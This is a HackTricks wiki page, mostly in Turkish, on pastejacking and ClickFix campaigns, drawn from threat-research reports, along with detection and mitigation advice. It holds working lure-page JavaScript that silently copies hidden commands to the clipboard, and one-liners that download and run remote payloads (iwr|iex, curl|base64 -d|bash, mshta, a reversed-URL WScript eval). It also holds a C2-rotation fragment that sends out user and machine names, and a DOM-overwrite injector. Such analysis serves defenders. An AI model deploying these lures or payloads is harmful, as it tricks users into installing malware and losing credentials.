# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kendiniz kopyalamadığınız hiçbir şeyi yapıştırmayın." – eski ama hâlâ geçerli bir öğüt

## Genel Bakış

Clipboard hijacking – also known as *pastejacking* – kullanıcıların komutları incelemeden rutin olarak kopyala-yapıştır yaptıkları gerçeğinden yararlanır. Kötü amaçlı bir web sayfası (veya Electron veya masaüstü uygulama gibi herhangi bir JavaScript-özellikli ortam) programatik olarak saldırgan kontrollü metni sistem panosuna yerleştirir. Kurbanlar genellikle özenle hazırlanmış sosyal mühendislik talimatlarıyla **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) tuşlarına basmaya veya bir terminal açıp panodaki içeriği *yapıştırmaya* teşvik edilir; bu da panodaki komutun hemen yürütülmesine yol açar.

Çünkü **hiçbir dosya indirilmiyor ve hiçbir ek açılmıyor**, teknik eklentileri, makroları veya doğrudan komut yürütmeyi izleyen çoğu e-posta ve web içeriği güvenlik kontrolünü atlatır. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader or Lumma Stealer gibi commodity malware ailelerini dağıtan phishing kampanyalarında popülerdir.

## JavaScript Kavram Kanıtı
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Daha eski kampanyalar `document.execCommand('copy')` kullanıyordu; yenileri ise asenkron **Clipboard API** (`navigator.clipboard.writeText`)'e dayanıyor.

## ClickFix / ClearFake Akışı

1. Kullanıcı, typosquatted veya ele geçirilmiş bir siteyi ziyaret eder (ör. `docusign.sa[.]com`)
2. Enjekte edilen **ClearFake** JavaScript, `unsecuredCopyToClipboard()` yardımcı fonksiyonunu çağırır; bu fonksiyon panoya Base64-encoded PowerShell one-liner'ı sessizce kaydeder.
3. HTML talimatları kurbana şunu söyler: *“**Win + R** tuşlarına basın, komutu yapıştırın ve sorunu çözmek için Enter'a basın.”*
4. `powershell.exe` çalışır; meşru bir yürütülebilir dosya ile kötü amaçlı bir DLL içeren bir arşivi indirir (klasik DLL sideloading).
5. Loader ek aşamaları deşifre eder, shellcode enjekte eder ve persistence kurar (ör. scheduled task) – nihayetinde NetSupport RAT / Latrodectus / Lumma Stealer çalıştırılır.

### Örnek NetSupport RAT Zinciri
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) kendi dizininde `msvcp140.dll` arar.
* Zararlı DLL, API'leri dinamik olarak **GetProcAddress** ile çözer, iki binary (`data_3.bin`, `data_4.bin`)'i **curl.exe** ile indirir, bunları rolling XOR key `"https://google.com/"` kullanarak deşifre eder, final shellcode'u enjekte eder ve **client32.exe** (NetSupport RAT)'ı `C:\ProgramData\SecurityCheck_v1\`'e unzip eder.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` dosyasını **curl.exe** ile indirir
2. JScript downloader'ı **cscript.exe** içinde çalıştırır
3. Bir MSI payload'u alır → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer ile MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** çağrısı gizli bir PowerShell betiği başlatır; bu betik `PartyContinued.exe` dosyasını alır, `Boat.pst` (CAB) içinden çıkarır, `extrac32` ve dosya birleştirme ile `AutoIt3.exe`'yi yeniden oluşturur ve sonunda tarayıcı kimlik bilgilerini `sumeriavgv.digital` adresine sızdıran bir `.a3x` betiğini çalıştırır.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Bazı ClickFix kampanyaları dosya indirmelerini tamamen atlayıp, kurbanlara WSH aracılığıyla JavaScript çekip çalıştıran, bunu kalıcı hale getiren ve C2'yi günlük olarak değiştiren tek satırlık bir komutu yapıştırmalarını söyler. Gözlemlenen örnek zincir:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Key traits
- Gözden geçirmeyi zorlaştırmak için URL çalışma zamanında tersine çevrilir.
- JavaScript kendini Startup LNK (WScript/CScript) aracılığıyla kalıcı hale getirir ve C2'yi günün tarihine göre seçer – hızlı domain rotation sağlar.

Tarihe göre C2'leri döndürmek için kullanılan minimal JS fragmanı:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Bir sonraki aşama genellikle persistence kuran ve bir RAT (ör. PureHVNC) çeken bir loader konuşlandırır; sıkça TLS'i hardcoded bir sertifikaya pinler ve trafiği chunking yapar.

Detection ideas specific to this variant
- Süreç ağacı: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Başlangıç öğeleri: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Uzun komut satırları olmadan uzun script'leri beslemek için büyük stdin payload'ları ile tekrarlanan `powershell -NoProfile -NonInteractive -Command -` kullanımı.
- Sonrasında LOLBins gibi programları çalıştıran Scheduled Tasks; örn. updater‑görünümlü bir görev/yolu altında `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` (örn. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Günlük dönen C2 host adları ve `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` desenine sahip URL'ler.
- Panoya yazma olaylarını, ardından Win+R ile yapıştırma ve hemen `powershell.exe` çalıştırılması ile korele edin.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** komutlarının geçmişini tutar – alışılmadık Base64 / obfuscated girişlere bakın.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Son kampanyalar sahte CDN/browser doğrulama sayfalarını ("Just a moment…", IUAM-style) seri olarak üretiyor; kullanıcıları panolarındaki OS-özgü komutları yerel konsollara kopyalamaya zorluyor. Bu, yürütmeyi tarayıcı sandbox'ından çıkarır ve Windows ile macOS'ta çalışır.

Key traits of the builder-generated pages
- OS detection via `navigator.userAgent` to tailor payloads (Windows PowerShell/CMD vs. macOS Terminal). Desteklenmeyen OS'ler için isteğe bağlı decoy/no-op'lar sahneyi korumak amacıyla kullanılabilir.
- Zararsız UI eylemlerinde (checkbox/Copy) otomatik clipboard-copy; görünen metin panodaki içerikten farklı olabilir.
- Mobil engelleme ve adım adım talimatlar içeren bir popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- İsteğe bağlı obfuscation ve tek dosyalık injector ile ele geçirilmiş bir sitenin DOM'unu Tailwind-stilli bir doğrulama UI'si ile overwrite etmek (yeni bir domain kaydı gerekmez).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS'te ilk çalıştırmanın kalıcılığı
- Kullanın `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` böylece terminal kapandıktan sonra yürütme devam eder ve görünür izleri azaltır.

Ele geçirilmiş sitelerde yerinde sayfa devralma
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Clipboard API'yi verification widget'lara bağlayan sayfalar; gösterilen metin ile clipboard payload'ı arasındaki uyumsuzluk; `navigator.userAgent` branching; Tailwind + tek sayfa içinde replace yapılan şüpheli bağlamlar.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` tarayıcı etkileşiminden kısa süre sonra; `%TEMP%`'ten çalıştırılan batch/MSI installer'lar.
- macOS endpoint: Terminal/iTerm'in tarayıcı olaylarına yakın zamanda `bash`/`curl`/`base64 -d` ile `nohup` başlatması; terminal kapandıktan sonra hayatta kalan arka plan işleri.
- `RunMRU` Win+R geçmişi ve clipboard yazımlarını sonraki console process oluşumları ile korelasyonlayın.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. Browser hardening – clipboard write-access'ı devre dışı bırakın (`dom.events.asyncClipboard.clipboardItem` vb.) veya user gesture gerektirin.
2. Security awareness – kullanıcılara hassas komutları *type* etmelerini veya önce bir text editor'e yapıştırmalarını öğretin.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control ile rastgele one-liner'ları engelleyin.
4. Network controls – bilinen pastejacking ve malware C2 domain'lerine outbound istekleri engelleyin.

## Related Tricks

* **Discord Invite Hijacking** genellikle kullanıcıları kötü amaçlı bir sunucuya çektikten sonra aynı ClickFix yaklaşımını suistimal eder:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
